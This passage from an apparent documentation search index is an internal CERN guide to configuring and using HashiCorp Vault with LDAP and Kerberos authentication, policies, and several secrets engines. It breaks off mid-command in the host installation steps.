- Password to use along with <code>binddn</code> argument when performing user search.</li> <li>url - The LDAP server to connect to. Examples: ldaps://xldap.cern.ch, ldap://cerndc.cern.ch, ldap://tndc.cern.ch (Check HERE for more details). This can also be a comma-delineated list of URLs, in which case the servers will be tried in-order if there are errors during the connection process.</li> <li>userattr - Attribute on user attribute object matching the username passed when authenticating. Examples: <code>sAMAccountName</code>, <code>cn</code>, <code>uid</code>.</li> <li>userdn - Base DN under which to perform user search. Example: <code>ou=Users,dc=example,dc=com</code>.</li> <li>groupfilter - Go template used when constructing the group membership query. The template can access the following context variables: [<code>UserDN</code>, <code>Username</code>]. The default is <code>(|(memberUid={{.Username}})(member={{.UserDN}})(uniqueMember={{.UserDN}}))</code>, which is compatible with several common directory schemas. To support nested group resolution for Active Directory, instead use the following query: <code>(&amp;(objectClass=group)(member:1.2.840.113556.1.4.1941:={{.UserDN}}))</code>. Both examples work with CERN LDAP schema.</li> <li>groupattr - LDAP attribute to follow on objects returned by <code>groupfilter</code> in order to enumerate user group membership. Examples: for groupfilter queries returning group objects, use: <code>cn</code>. For queries returning user objects, use: <code>memberOf</code>. The default is <code>cn</code>.</li> <li>groupdn - LDAP search base to use for group membership search. This can be the root containing either groups or users. Example: <code>ou=Groups,dc=example,dc=com</code></li> <li>certificate - CA certificate to use when verifying LDAP server certificate, must be x509 PEM encoded. CERN certs are under <code>/etc/openldap/cacerts</code></li> <li>insecure_tls - If true, skips LDAP server SSL certificate verification - insecure, use with caution!</li> <li>starttls - If true, issues a <code>StartTLS</code> command after establishing an unencrypted connection.</li> <li>discoverdn - If true, use anonymous bind to discover the bind DN of a user.</li> <li>case_sensitive_names - If set, user and group names assigned to policies within the backend will be case sensitive. Otherwise, names will be normalized to lower case. Case will still be preserved when sending the username to the LDAP server at login time; this is only for matching local user/group definitions.</li> <li>use_token_groups - If true, groups are resolved through Active Directory tokens. This speeds up nested group membership resolution in large directories significantly. Highly recommended to enable this with CERN LDAP.</li> <li>upndomain - userPrincipalDomain used to construct the UPN string for the authenticating user. The constructed UPN will appear as <code>[username]@UPNDomain</code>. Example: <code>[example.com](http://example.com)</code>, which will cause vault to bind as <code>[username@example.com](mailto:username@example.com)</code>. CERN uses auth by username not by email so this must not be set.</li> <li>username_as_alias - If set to true, forces the auth method to use the username passed by the user as the alias name. (This would be convenient, but seems to not work for host keytab logins)</li> </ul> <p>Map Vault policies to LDAP groups:</p> Bash<pre><code>vault write auth/ldap/groups/&lt;LDAP GROUP NAME&gt; policies=&lt;VAULT POLICY NAME&gt;\n</code></pre>"},{"location":"content/devops/vaultkrb/#kerberos-config-host-auth","title":"Kerberos config (host auth)","text":"<p>Official Vault Kerberos documentation and API documentation.</p> <p>Enable Kerberos authentication in Vault:</p> Bash<pre><code>vault auth enable \\\n  -passthrough-request-headers=Authorization \\\n  -allowed-response-headers=www-authenticate \\\n  kerberos\n</code></pre> <p>Encode keytab for the Kerberos plugin (on the same machine Vault service is deployed on):</p> Bash<pre><code>base64 /etc/krb5.keytab &gt; krb5.keytab.base64\n</code></pre> <p>Configure the Kerberos auth method with the encoded keytab and entry name that will be used to verify inbound login requests:</p> Bash<pre><code>vault write auth/kerberos/config \\\n  keytab=@krb5.keytab.base64 \\\n  service_account=\"host/vault.cern.ch\"\n</code></pre> <p>NOTE: <code>service_account</code> must match a valid principal in the keytab!</p> <p>Configure the Kerberos auth method to communicate with LDAP (for host secrets):</p> Bash<pre><code>vault write auth/kerberos/config/ldap \\\n  binddn=\"CN=&lt;SERVICE_USER&gt;,OU=Users,OU=Organic Units,DC=cern,dc=ch\" \\\n  bindpass=\"&lt;SERVICE_PASSWORD&gt;\" \\\n  url=\"ldap://cerndc.cern.ch\" \\\n  userattr=sAMAccountName \\\n  userdn=\"DC=cern,DC=ch\" \\\n  groupfilter=\"(&amp;(objectClass=group)(member:1.2.840.113556.1.4.1941:={{.UserDN}}))\" \\\n  groupattr=memberOf \\\n  groupdn=\"OU=Workgroups,DC=cern,DC=ch\" \\\n  certificate=\"@/etc/openldap/cacerts/CERN_Root_Certification_Authority_2.pem\" \\\n  insecure_tls=false \\\n  starttls=true \\\n  discoverdn=false \\\n  case_sensitive_names=true \\\n  use_token_groups=true \\\n  upndomain=\"\" \\\n  username_as_alias=true\n</code></pre> <p>Arguments are described in detail in the LDAP configuration section and not duplicated here as they are identical.</p> <p>Map Vault policies to LDAP groups:</p> Bash<pre><code>vault write auth/kerberos/groups/&lt;LDAP GROUP NAME&gt; policies=&lt;VAULT POLICY NAME&gt;\n</code></pre>"},{"location":"content/devops/vaultkrb/#creating-policies","title":"Creating policies","text":"<p>Official Vault Policies documentation</p> <p>Everything in Vault is path based, and policies are no exception. Policies provide a declarative way to grant or forbid access to certain paths and operations in Vault. This section discusses policy workflows and syntaxes.</p> <p>Policies are deny by default, so an empty policy grants no permission in the system.</p>"},{"location":"content/devops/vaultkrb/#syntax-and-usage","title":"Syntax and usage","text":"<p>Policies are written in HCL or JSON and describe which paths in Vault a user or machine is allowed to access.</p> <p>Here is a very simple policy which grants read capabilities to the path <code>secret/foo</code>:</p> Text Only<pre><code>path \"secret/foo\" {\n  capabilities = [\"read\"]\n}\n</code></pre> <p>When this policy is assigned to a token, the token can read from <code>secret/foo</code>. However, the token cannot update or delete <code>secret/foo</code>, since the capabilities do not allow it. Because policies are deny by default, the token would have no other access in Vault.</p> <p>Here is a more detailed policy, and it is documented inline:</p> Text Only<pre><code># This section grants all access on \"secret/*\". Further restrictions can be\n# applied to this broad policy, as shown below.\npath \"secret/*\" {\n  capabilities = [\"create\", \"read\", \"update\", \"delete\", \"list\"]\n}\n\n# Even though we allowed secret/*, this line explicitly denies\n# secret/super-secret. This takes precedence.\npath \"secret/super-secret\" {\n  capabilities = [\"deny\"]\n}\n\n# Policies can also specify allowed, disallowed, and required parameters. Here\n# the key \"secret/restricted\" can only contain \"foo\" (any value) and \"bar\" (one\n# of \"zip\" or \"zap\").\npath \"secret/restricted\" {\n  capabilities = [\"create\"]\n  allowed_parameters = {\n    \"foo\" = []\n    \"bar\" = [\"zip\", \"zap\"]\n  }\n}\n</code></pre> <p>Policies use path-based matching to test the set of capabilities against a request. A policy <code>path</code> may specify an exact path to match, or it could specify a glob pattern which instructs Vault to use a prefix match:</p> Text Only<pre><code># Permit reading only \"secret/foo\". An attached token cannot read \"secret/food\"\n# or \"secret/foo/bar\".\npath \"secret/foo\" {\n  capabilities = [\"read\"]\n}\n\n# Permit reading everything under \"secret/bar\". An attached token could read\n# \"secret/bar/zip\", \"secret/bar/zip/zap\", but not \"secret/bars/zip\".\npath \"secret/bar/*\" {\n  capabilities = [\"read\"]\n}\n\n# Permit reading everything prefixed with \"zip-\". An attached token could read\n# \"secret/zip-zap\" or \"secret/zip-zap/zong\", but not \"secret/zip/zap\npath \"secret/zip-*\" {\n  capabilities = [\"read\"]\n}\n</code></pre> <p>In addition, a <code>+</code> can be used to denote any number of characters bounded within a single path segment:</p> Text Only<pre><code># Permit reading the \"teamb\" path under any top-level path under secret/\npath \"secret/+/teamb\" {\n  capabilities = [\"read\"]\n}\n\n# Permit reading secret/foo/bar/teamb, secret/bar/foo/teamb, etc.\npath \"secret/+/+/teamb\" {\n  capabilities = [\"read\"]\n}\n</code></pre>"},{"location":"content/devops/vaultkrb/#path-capabilities-cheat-sheet","title":"Path capabilities cheat sheet","text":"<p><code>create</code> (<code>POST/PUT</code>) - Allows creating data at the given path. Very few parts of Vault distinguish between <code>create</code> and <code>update</code>, so most operations require both <code>create</code> and <code>update</code> capabilities. Parts of Vault that provide such a distinction are noted in documentation.</p> <p><code>read</code> (<code>GET</code>) - Allows reading the data at the given path.</p> <p><code>update</code> (<code>POST/PUT</code>) - Allows changing the data at the given path. In most parts of Vault, this implicitly includes the ability to create the initial value at the path.</p> <p><code>delete</code> (<code>DELETE</code>) - Allows deleting the data at the given path.</p> <p><code>list</code> (<code>LIST</code>) - Allows listing values at the given path. Note that the keys returned by a <code>list</code> operation are not filtered by policies. Do not encode sensitive information in key names. Not all backends support listing.</p> <p>In addition to the standard set, there are some capabilities that do not map to HTTP verbs.</p> <p><code>sudo</code> - Allows access to paths that are root-protected. Tokens are not permitted to interact with these paths unless they have the <code>sudo</code> capability (in addition to the other necessary capabilities for performing an operation against that path, such as <code>read</code> or <code>delete</code>).</p> <p>For example, modifying the audit log backends requires a token with <code>sudo</code> privileges.</p> <p><code>deny</code> - Disallows access. This always takes precedence regardless of any other defined capabilities, including <code>sudo</code>.</p>"},{"location":"content/devops/vaultkrb/#templating-policies","title":"Templating policies","text":"<p>Policy templating allows the automating mapping of paths to certain users for example. Admin has no way of knowing who exactly will log into Vault and it would be very time inefficient to create a path for each user's personal secrets manually, templating enables to automate this.</p> Name Description <code>identity.entity.id</code> The entity's ID <code>identity.entity.name</code> The entity's name <code>identity.entity.metadata.&lt;metadata key&gt;</code> Metadata associated with the entity for the given key <code>identity.entity.aliases.&lt;mount accessor&gt;.id</code> Entity alias ID for the given mount <code>identity.entity.aliases.&lt;mount accessor&gt;.name</code> Entity alias name for the given mount <code>identity.entity.aliases.&lt;mount accessor&gt;.metadata.&lt;metadata key&gt;</code> Metadata associated with the alias for the given mount and metadata key <code>identity.entity.aliases.&lt;mount accessor&gt;.custom_metadata.&lt;custom_metadata key&gt;</code> Custom metadata associated with the alias for the given mount and custom metadata key <code>identity.groups.ids.&lt;group id&gt;.name</code> The group name for the given group ID <code>identity.groups.names.&lt;group name&gt;.id</code> The group ID for the given group name <code>identity.groups.ids.&lt;group id&gt;.metadata.&lt;metadata key&gt;</code> Metadata associated with the group for the given key <code>identity.groups.names.&lt;group name&gt;.metadata.&lt;metadata key&gt;</code> Metadata associated with the group for the given key <p>Examples:</p> <p>If you wanted to create a shared section of KV that is associated with entities that are in a group:</p> Text Only<pre><code># In the example below, the group ID maps a group and the path\npath \"secret/data/groups/{{identity.groups.ids.fb036ebc-2f62-4124-9503-42aa7A869741.name}}/*\" {\n  capabilities = [\"create\", \"update\", \"read\", \"delete\"]\n}\n\npath \"secret/metadata/groups/{{identity.groups.ids.fb036ebc-2f62-4124-9503-42aa7A869741.name}}/*\" {\n  capabilities = [\"list\"]\n}\n</code></pre> <p>If you wanted to create personal secrets path for every use that logs in using LDAP:</p> Text Only<pre><code># Anyone who logs in using LDAP with accessor auth_ldap_35641cad can create, update, read, delete secrets under the path kv/personal/&lt;LDAP USERNAME&gt;\npath \"kv/personal/{{identity.entity.aliases.auth_ldap_35641cad.name}}/*\" { \u00a0\n  capabilities = [ \"create\", \"list\", \"update\", \"read\", \"delete\" ]\n}\n</code></pre>"},{"location":"content/devops/vaultkrb/#client-guide","title":"CLIENT GUIDE","text":""},{"location":"content/devops/vaultkrb/#necessary-first-step-client","title":"Necessary first step (client)","text":"<p>Current CERN Kerberos configuration includes the lines which are incompatible with Vault as parsing these lines leads Vault to believe that the Kerberos is using v4 instead of v5:</p> Text Only<pre><code>v4_name_convert = {\n  host = {\n    rcmd = host\n  }\n}\n</code></pre> <p>Duplicate Kerberos configuration:</p> Bash<pre><code>cp /etc/krb5.conf /etc/krb5.conf.nov4\n</code></pre> <p>Remove incompatible Kerberos v4 lines (the following command finds the line <code>v4_name_convert</code> and deletes it + 4 lines after it in a file):</p> Bash<pre><code>sed -i \"$(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1),$(expr $(grep -n v4_name_convert /etc/krb5.conf.nov4 | cut -d : -f1) + 4)d\" /etc/krb5.conf.nov4\n</code></pre>"},{"location":"content/devops/vaultkrb/#user-auth","title":"User auth","text":"<p>The easiest way for users to authenticate to Vault is using the LDAP method.</p> <p>Authenticate to Vault using Vault CLI:</p> Bash<pre><code>vault login -method=ldap username=&lt;YOUR USERNAME&gt;\n</code></pre>"},{"location":"content/devops/vaultkrb/#host-auth","title":"Host auth","text":"<p>The easiest way of automating access to Vault for hosts, deployment of apps, services or other autonomous tasks is to leverage keytabs and use the Vault's Kerberos login method. Every CERN host has or can have a valid keytab by using the <code>cern-get-keytab</code> CLI tool. The following will leverage this keytab as a means of authenticating to Vault. Please note that you can also create a key for a service as per the official documentation, but this will not provide any meaningful compartmentalization as any automated tasks will still have to be executed as root. The only way to compartmentalize Vault access and secrets is to add hosts to e-groups/LDAP groups and map Vault policies to those groups.</p> <p>Users can also use the Kerberos methods, but this will require extra steps (like creating a keytab, as the cache can't be used) that may prove this method to be too inconvenient compared to using LDAP.</p> <p>NOTE: this auth method gets a non-renewable token from Vault! TTL is set by the Vault administrator or whoever manages host auth policies. By default this token will be valid for 768h. Non-renewable token means that the service cannot use the obtained Vault token to request a new Vault token, instead renewal must be done by doing the described process again.</p> <p>Authenticate to Vault using Vault CLI:</p> Bash<pre><code>vault login -method=ldap username=&lt;YOUR USERNAME&gt;\n</code></pre> <p>Arguments in detail:</p> <ul> <li>username - a valid Kerberos principal in a valid keytab.</li> <li>service - a valid principal that Vault back-end should use for obtaining a service ticket for gaining a SPNEGO token. This principal must also exist in LDAP.</li> <li>realm - name of the Kerberos realm. This realm must match the UPNDomain configured on the LDAP connection. This check is case-sensitive.</li> <li>keytab_path - path to a valid Kerberos ketab. The principal supplied as a username mentioned before must exist in this keytab.</li> <li>krb5conf_path - path to a valid Kerberos configuration. Note that some v4 settings will cause Vault to interpret an otherwise valid v5 configuration as invalid.</li> <li>disable_fast_negotiation (boolean) - toggle Kerberos auth method's default of using FAST negotiation. FAST is a pre-authentication framework for Kerberos. It includes a mechanism for tunneling pre-authentication exchanges using armoured KDC messages. FAST provides increased resistance to passive password guessing attacks. Some common Kerberos implementations do not support FAST negotiation. CERN Kerberos does not support FAST.</li> </ul> <p>OR authenicate to Vault using REST API:</p> <p><code>/auth/kerberos/login</code> endpoint allows you to log in with a valid Kerberos SPNEGO token. This token is obtained by the client, marshalled, and converted to base 64 using standard encoding.</p> <p>TODO: figure out and document a way to obtain a Kerberos SPNEGO token without Vault CLI or other dependencies.</p> Bash<pre><code>curl \\\n  --header \"Authorization: Negotiate &lt;BASE64 SPNEGO TOKEN&gt;\" \\\n  --request POST \\\n  http://$(VAULT_ADDR):8200/v1/auth/kerberos/login\n</code></pre>"},{"location":"content/devops/vaultkrb/#using-vault","title":"Using Vault","text":"<p>Everything in Vault is path based, you can imagine these paths as similar to a Linux file tree, there is a root and paths spring out from there. Policies (created by admins or moderators of Vault) provide a declarative way to grant or forbid access to certain paths and operations in Vault.</p> <p>For any of the following to work requires a Vault admin to enable the use of any of the following secret engines.</p>"},{"location":"content/devops/vaultkrb/#key-value-secrets","title":"Key-Value Secrets","text":"<p>Official Vault KV Secrets documentation.</p> <p>The <code>kv</code> secrets engine is a generic Key-Value store used to store arbitrary secrets within the configured physical storage for Vault. This backend can be run in one of two modes; either it can be configured to store a single value for a key or, versioning can be enabled and a configurable number of versions for each key will be stored.</p> <p>When running the <code>kv</code> secrets backend non-versioned, only the most recently written value for a key will be preserved. The benefits of non-versioned <code>kv</code> is a reduced storage size for each key since no additional metadata or history is stored. Additionally, requests going to a backend configured this way will be more performant because for any given request there will be fewer storage calls and no locking.</p> <p>Non-versioned aka KV V1 is easier to set up and requires almost no extra setup.</p>"},{"location":"content/devops/vaultkrb/#secret-sharing-using-keyvalue-v1","title":"Secret sharing using key/value V1","text":"<p>Keeping personal secrets, sharing secrets with colleagues can be done most easily by mapping policies to e-groups/LDAP groups and using policy templating. The following chapters documents the usage of using the KV V1 usage and not the KV V2.</p>"},{"location":"content/devops/vaultkrb/#short-of-it-cheat-sheet","title":"Short of it - cheat sheet","text":"<p>List enabled secrets engines:</p> Bash<pre><code>vault secrets list\n</code></pre> <p>To set key/value secrets:</p> <ul> <li>Using CLI: <code>vault kv put &lt;KV ENGINE NAME&gt;/&lt;PATH&gt; &lt;KEY&gt;=&lt;VALUE&gt;</code></li> <li>Using API:</li> </ul> Bash<pre><code>curl --header \"X-Vault-Token: $VAULT_TOKEN\" \\ --request POST \\ --data @payload.json \\ $VAULT_ADDR/v1/&lt;KV ENGINE NAME&gt;/&lt;SECRET PATH&gt;\n</code></pre> <p>Where payload is:   <code>{ \"key\": \"AAaaBBccDDeeOTXzSMT1234BB_Z8JzG7JkSVxI\" }</code></p> <p>To get key/value secrets:</p> <ul> <li>Using CLI:</li> </ul> Bash<pre><code>vault kv get &lt;KV ENGINE NAME&gt;/&lt;PATH&gt;\n</code></pre> <ul> <li>Using API:</li> </ul> Bash<pre><code>curl --header \"X-Vault-Token: $VAULT_TOKEN\" \\ $VAULT_ADDR/v1/&lt;KV ENGINE NAME&gt;/&lt;SECRET PATH&gt;\n</code></pre> <p>If you wish to enter secrets without exposing the secret in my shell's history:</p> <ul> <li>Using CLI, use a dash \"-\": <code>vault kv put &lt;KV ENGINE NAME&gt;/&lt;PATH&gt; &lt;KEY&gt;=-</code></li> <li>Use dash</li> <li>Press enter</li> <li>Type the secret</li> <li>Press Ctrl+d to end the pipe and write the secret</li> <li>Using API, use a JSON file for the payload.</li> </ul>"},{"location":"content/devops/vaultkrb/#long-of-it-a-practical-demo","title":"Long of it - a practical demo","text":"<p>The following policy is something that is set up by the Vault admins, this is not something the client will have to bother with, but is displayed here just to provide extra context. Following example allows anyone with this policy to:</p> <ul> <li>see all secret paths (NOT secret values!) and create new secrets (only if secret does not exist, overwriting is not possible) under the enabled key-value store called <code>kv</code> via CLI and web UI.</li> <li>create, update, read and delete secrets under the <code>kv/acc-adm</code> path.</li> <li>create, update, read and delete secrets under their own name path in <code>kv</code> personal secrets path aka <code>kv/personal/&lt;USERNAME&gt;</code></li> </ul> Terraform<pre><code># List all secret paths\n# Send write-only secrets to others\npath \"kv/*\" {\n  capabilities = [ \"create\", \"list\" ]\n}\n\n# Web UI usage\npath \"kv/metadata\" {\n  capabilities = [\"list\"]\n}\n\n###################### General secrets\n\n# General acc-adm secrets\npath \"kv/acc-adm/*\" {\n  capabilities = [ \"create\", \"list\", \"update\", \"read\", \"delete\" ]\n}\n\n###################### Personal secrets\n\n# Personal secrets\npath \"kv/personal/{{identity.entity.aliases.auth_ldap_35641cad.name}}/*\" {\n  capabilities = [ \"create\", \"list\", \"update\", \"read\", \"delete\" ]\n}\n</code></pre>"},{"location":"content/devops/vaultkrb/#scenario-1-one-way-secret-sharing-with-another-user","title":"Scenario 1 - one way secret sharing with another user","text":"<p>Say that you wanted to share a secret to user called <code>kturvas</code>. You would use the following CLI command:</p> Bash<pre><code>vault kv put kv/personal/kturvas/inbox secret_i_want_to_share=hunter2\n</code></pre> <p>This command will succeed if <code>secret_i_want_to_share</code> does not yet exist, if it exists, you would have to choose another name for the secret, because you do not have the right to update existing secret values.</p> <p>But you would also notice that you can not read that value you shared with that user (you could test that by trying with <code>vault kv get kv/personal/kturvas</code>), because you only have write access.</p> <p>You would only be able to read, create, update, and delete secrets under your own user path <code>kv/personal/&lt;YOUR USERNAME&gt;</code></p> <p>So in essence this policy allows anyone to create write-only secrets which makes sharing secrets easy and secure.</p>"},{"location":"content/devops/vaultkrb/#scenario-2-general-secret-sharing","title":"Scenario 2 - general secret sharing","text":"<p>Say that you wanted to share a new password for a generic service user <code>accsvc</code> that is used by everyone in your group. Let's say that the group is <code>acc-adm-support</code> e-group.</p> <p>Assuming admin linked the policy to the <code>acc-adm-support</code> e-group then I would have access to\u00a0create, update, read and delete secrets under the <code>kv/acc-adm</code> path upon login to Vault.</p> <p>So you would use the following CLI command:</p> Bash<pre><code>vault kv put kv/acc-adm/services/accsvc password=N3wSecur3p4ssw0rD!\n</code></pre>"},{"location":"content/devops/vaultkrb/#transit-secrets","title":"Transit secrets","text":"<p>The transit secrets engine handles cryptographic functions on data in-transit. Vault doesn't store the data sent to the secrets engine. It can also be viewed as \"cryptography as a service\" or \"encryption as a service\". The transit secrets engine can also sign and verify data; generate hashes and HMACs of data; and act as a source of random bytes.</p> <p>The primary use case for <code>transit</code> is to encrypt data from applications while still storing that encrypted data in some primary data store. This relieves the burden of proper encryption/decryption from application developers and pushes the burden onto the operators of Vault.</p> <p>After the secrets engine is configured and a user/machine has a Vault token with the proper permission, it can use this secrets engine.</p>"},{"location":"content/devops/vaultkrb/#usage-example","title":"Usage example","text":"<p>Encrypt some plaintext data using the <code>/encrypt</code> endpoint with a named key:</p> <p>NOTE: All plaintext data must be base64-encoded. The reason for this requirement is that Vault does not require that the plaintext is \"text\". It could be a binary file such as a PDF or image. The easiest safe transport mechanism for this data as part of a JSON payload is to base64-encode it.</p> <p>NOTE2: Vault HTTP API imposes a maximum request size of 32MB to prevent a denial of service attack. This can be tuned per <code>listener</code> block in the Vault server configuration.</p> Bash<pre><code>vault write transit/encrypt/my-key plaintext=$(base64 &lt;&lt;&lt; \"my secret data\")\n</code></pre> <p>You are the retured a key/value combination with the ciphertext.</p> <p>Decrypt a piece of data using the <code>/decrypt</code> endpoint with a named key:</p> Bash<pre><code>vault write transit/decrypt/my-key ciphertext=vault:v1:8SDd3WHDOjf7mq69CyCqYjBXAiQQAVZRkFM13ok481zoCmHnSeDX9vyf7w==\n</code></pre> <p>The resulting data is base64-encoded (see the note above for details on why). Decode it to get the raw plaintext:</p> Bash<pre><code>base64 --decode &lt;&lt;&lt; \"bXkgc2VjcmV0IGRhdGEK\"\n</code></pre>"},{"location":"content/devops/vaultkrb/#transform-secrets-requires-vault-enterprise","title":"Transform secrets (requires Vault Enterprise)","text":"<p>The transform secrets engine handles secure data transformation and tokenization against provided input value. The secret engine currently supports <code>fpe</code>, <code>masking</code>, and <code>tokenization</code> as data transformation types. The secret engine currently supports <code>fpe</code>, <code>masking</code>, and <code>tokenization</code> as data transformation types.</p>"},{"location":"content/devops/vaultkrb/#usage-example-transform","title":"Usage example (transform)","text":"<p>After the secrets engine is configured and a user/machine has a Vault token with the proper permission, it can use this secrets engine to encode and decode input values.</p> <p>Encode some input value using the <code>/encode</code> endpoint with a named role:</p> Bash<pre><code>vault write transform/encode/payments value=1111-2222-3333-4444\n</code></pre> <p>Which returns:</p> Text Only<pre><code>Key              Value\n---              -----\nencoded_value    9300-3376-4943-8903\n</code></pre> <p>Decode some input value using the <code>/decode</code> endpoint with a named role:</p> Bash<pre><code>vault write transform/decode/payments value=9300-3376-4943-8903\n</code></pre> <p>Which returns:</p> Text Only<pre><code>Key              Value\n---              -----\ndecoded_value    1111-2222-3333-4444\n</code></pre> <p>Decode some input value using the <code>/decode</code> endpoint with a named role and decode format:</p> Bash<pre><code>vault write transform/decode/payments/last-four value=9300-3376-4943-8903\n</code></pre> <p>Which returns:</p> Text Only<pre><code>Key              Value\n---              -----\ndecoded_value    4444\n</code></pre>"},{"location":"content/devops/vaultkrb/#active-directory-secrets","title":"Active Directory secrets","text":"<p>The Active Directory (AD) secrets engine has two main features:</p> <p>The first feature (password rotation) is where the AD secrets engine rotates AD passwords dynamically. This is designed for a high-load environment where many instances may be accessing a shared password simultaneously. With a simple set up and a simple creds API, it doesn't require instances to be manually registered in advance to gain access.\u00a0Passwords are lazily rotated based on preset TTLs and can have a length configured to meet your needs. Additionally, passwords can be manually rotated using the rotate-role endpoint.</p> <p>The second feature (service account check-out) is where a library of service accounts can be checked out by a person or by machines. Vault will automatically rotate the password each time a service account is checked in. Service accounts can be voluntarily checked in, or Vault will check them in when their lending period (or, \"ttl\", in Vault's language) ends.</p>"},{"location":"content/devops/vaultkrb/#openldap-secrets","title":"OpenLDAP secrets","text":"<p>The OpenLDAP secret engine allows management of LDAP entry passwords as well as dynamic creation of credentials. This engine supports interacting with Active Directory which is compatible with LDAP v3.</p>"},{"location":"content/devops/vaultkrb/#pki-secrets","title":"PKI secrets","text":"<p>The PKI secrets engine generates dynamic X.509 certificates. With this secrets engine, services can get certificates without going through the usual manual process of generating a private key and CSR, submitting to a CA, and waiting for a verification and signing process to complete. Vault's built-in authentication and authorization mechanisms provide the verification functionality.</p> <p>By keeping TTLs relatively short, revocations are less likely to be needed, keeping CRLs short and helping the secrets engine scale to large workloads. This in turn allows each instance of a running application to have a unique certificate, eliminating sharing and the accompanying pain of revocation and rollover.</p> <p>In addition, by allowing revocation to mostly be forgone, this secrets engine allows for ephemeral certificates. Certificates can be fetched and stored in memory upon application startup and discarded upon shutdown, without ever being written to disk.</p>"},{"location":"content/devops/vaultkrb/#usage-example-pki","title":"Usage example (pki)","text":"<p>Configure a CA certificate and private key. Vault can accept an existing key pair, or it can generate its own self-signed root. In general, we recommend maintaining your root CA outside of Vault and providing Vault a signed intermediate CA:</p> Bash<pre><code>vault write pki/root/generate/internal common_name=my-website.com ttl=8760h\n</code></pre> <p>Which returns:</p> Text Only<pre><code>Key              Value\n---              -----\ncertificate      -----BEGIN CERTIFICATE-----...\nexpiration       1536807433\nissuing_ca       -----BEGIN CERTIFICATE-----...\nserial_number    7c:f1:fb:2c:6e:4d:99:0e:82:1b:08:0a:81:ed:61:3e:1d:fa:f5:29\n</code></pre> <p>Update the CRL location and issuing certificates:</p> Bash<pre><code>vault write pki/config/urls issuing_certificates=\"http://127.0.0.1:8200/v1/pki/ca\" crl_distribution_points=\"http://127.0.0.1:8200/v1/pki/crl\"\n</code></pre> <p>Configure a role that maps a name in Vault to a procedure for generating a certificate. When users or machines generate credentials, they are generated against this role:</p> Bash<pre><code>vault write pki/roles/example-dot-com allowed_domains=my-website.com allow_subdomains=true max_ttl=72h\n</code></pre> <p>Generate a new credential by writing to the <code>/issue</code> endpoint with the name of the role:</p> Bash<pre><code>vault write pki/issue/example-dot-com common_name=www.my-website.com\n</code></pre> <p>Which returns:</p> Text Only<pre><code>Key                 Value\n---                 -----\ncertificate         -----BEGIN CERTIFICATE-----...\nissuing_ca          -----BEGIN CERTIFICATE-----...\nprivate_key         -----BEGIN RSA PRIVATE KEY-----...\nprivate_key_type    rsa\nserial_number       1d:2e:c6:06:45:18:60:0e:23:d6:c5:17:43:c0:fe:46:ed:d1:50:be\n</code></pre>"},{"location":"content/devops/vaultkrb/#database-secrets","title":"Database secrets","text":"<p>The database secrets engine generates database credentials dynamically based on configured roles. It works with a number of different databases through a plugin interface. There are a number of built-in database types, and an exposed framework for running custom database types for extendability. This means that services that need to access a database no longer need to hardcode credentials: they can request them from Vault, and use Vault's leasing mechanism to more easily roll keys. These are referred to as \"dynamic roles\" or \"dynamic secrets\".</p> <p>Since every service is accessing the database with unique credentials, it makes auditing much easier when questionable data access is discovered. You can track it down to the specific instance of a service based on the SQL username.</p> <p>Vault makes use of its own internal revocation system to ensure that users become invalid within a reasonable time of the lease expiring.</p> <p>Supported databases:</p> <ul> <li>Cassandra</li> <li>Couchbase</li> <li>Elasticsearch</li> <li>HanaDB</li> <li>IBM Db2</li> <li>InfluxDB</li> <li>MongoDB</li> <li>MongoDB Atlas</li> <li>MSSQL</li> <li>MySQL/MariaDB</li> <li>Oracle</li> <li>PostgreSQL</li> <li>Redshift</li> <li>Snowflake</li> <li>Custom</li> </ul>"},{"location":"content/devops/vaultkrb/#usage-quick-guide","title":"USAGE QUICK GUIDE","text":""},{"location":"content/devops/vaultkrb/#cli","title":"CLI","text":"<p>Install Vault according to the official documentation. For CentOS:</p> Bash<pre><code>sudo yum install -y yum-utils\n</code></pre> Bash<pre><code>sudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo\n</code></pre> Bash<pre><code>sudo yum -y install vault\n</code></pre>"},{"location":"content/devops/vaultkrb/#cern-ad-user-usage","title":"CERN AD user usage","text":"<p>NOTE: following requires that you are part of the <code>acc-adm-support</code> e-group!</p> <p>Set Vault address:</p> Bash<pre><code>export VAULT_ADDR='https://vault.cern.ch:8200'\n</code></pre> <p>Authenticate using LDAP method:</p> Bash<pre><code>vault login -method=ldap username=\"$USER\"\n</code></pre> <p>List enabled secrets engines:</p> Bash<pre><code>vault secrets list\n</code></pre>"},{"location":"content/devops/vaultkrb/#personal-secrets","title":"Personal secrets","text":"<p>Personal secrets path is a path that only one account has access to, the path where you create secrets that are specific to your use cases.</p> <p>Set key/value secrets under your personal user secrets path:</p> Bash<pre><code>vault kv put kv/personal/\"$USER\"/demosecret my_first_secret=sUp3rSuD0\n</code></pre> <p>Note that you are able to create secrets UNDER (<code>kv/personal/\"$USER\"/*</code>) your users path, but no ON (<code>kv/personal/\"$USER\"</code>) it.</p> <p>Get the secret you just put into Vault:</p> Bash<pre><code>vault kv get kv/personal/\"$USER\"/demosecret\n</code></pre> <p>List all secret paths under your user name:</p> Bash<pre><code>vault kv list kv/personal/\"$USER\"/\n</code></pre>"},{"location":"content/devops/vaultkrb/#inbox-secrets","title":"Inbox secrets","text":"<p>Inbox secrets is a path template that allows sharing secrets with one account. Under every personal secret path there is a special sub path called inbox where other users have read/write access to (this is the only path in the personal secrets path where others have read/write access to). That path is <code>personal/&lt;USERNAME&gt;/inbox/from-&lt;ANY OTHER USERNAME&gt;/*</code></p> <p>Send someone else a secret:</p> Bash<pre><code>vault kv put kv/personal/kturvas/inbox/from-\"$USER\"/demosecret secret_from_\"$USER\"=HelloVault!\n</code></pre> <p>Note that you only have access to other people's personal secrets path if it is under the inbox paths <code>kv/personal/*/inbox/from-\"$USER\"</code> and <code>kv/personal/*/inbox/\"$USER\"</code></p>"},{"location":"content/devops/vaultkrb/#general-secrets","title":"General secrets","text":"<p>General secrets correspond to some policy that allows reading/writing secrets shared by a group of users (like users of an e-group/LDAP group). The following requires that you are part of the <code>acc-adm-support</code> e-group for example.</p> <p>Using what you've learned in the previous steps, try creating a secret under the path <code>kv/acc-adm</code> and then try fetching it or use the command</p> Bash<pre><code>vault kv list\n</code></pre>"},{"location":"content/devops/vaultkrb/#host","title":"Host","text":"<p>Install Vault according to the official documentation. For CentOS:</p> Bash<pre><code>sudo yum install -y yum-utils\n</code></pre> Bash<pre><code>sudo yum-config-manager --add-repo 